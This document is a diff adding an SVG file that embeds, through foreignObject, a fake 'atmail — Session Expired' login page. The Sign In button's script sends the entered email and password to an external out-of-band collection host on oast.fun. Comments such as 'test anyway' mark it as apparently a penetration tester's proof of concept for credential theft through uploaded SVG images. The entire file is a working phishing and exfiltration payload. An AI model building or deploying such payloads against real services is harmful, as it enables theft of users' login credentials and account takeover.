@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xhtml="http://www.w3.org/1999/xhtml"
+     width="800" height="600">
+  <rect width="800" height="600" fill="#1a1a2e"/>
+  <!-- foreignObject embeds full HTML inside SVG -->
+  <foreignObject x="0" y="0" width="800" height="600">
+    <xhtml:body>
+      <xhtml:div style="background:#1a1a2e;color:white;padding:40px;font-family:Arial">
+        <xhtml:h2>atmail — Session Expired</xhtml:h2>
+        <xhtml:p>Your session has expired. Please log in again.</xhtml:p>
+        <xhtml:input type="text" placeholder="Email" 
+          style="display:block;width:300px;margin:10px 0;padding:8px"/>
+        <xhtml:input type="password" placeholder="Password"
+          style="display:block;width:300px;margin:10px 0;padding:8px"/>
+        <!-- form-action none may block this but test anyway -->
+        <xhtml:button onclick="
+          fetch('https://xpxhznhjlolwxxyvdurgehk2cmtiyvvhh.oast.fun/test5-foreign?u='+
+          document.querySelector('input').value+'&amp;p='+
+          document.querySelectorAll('input')[1].value)
+        " style="background:crimson;color:white;padding:10px 20px;border:none">
+          Sign In
+        </xhtml:button>
+      </xhtml:div>
+    </xhtml:body>
+  </foreignObject>
+</svg>
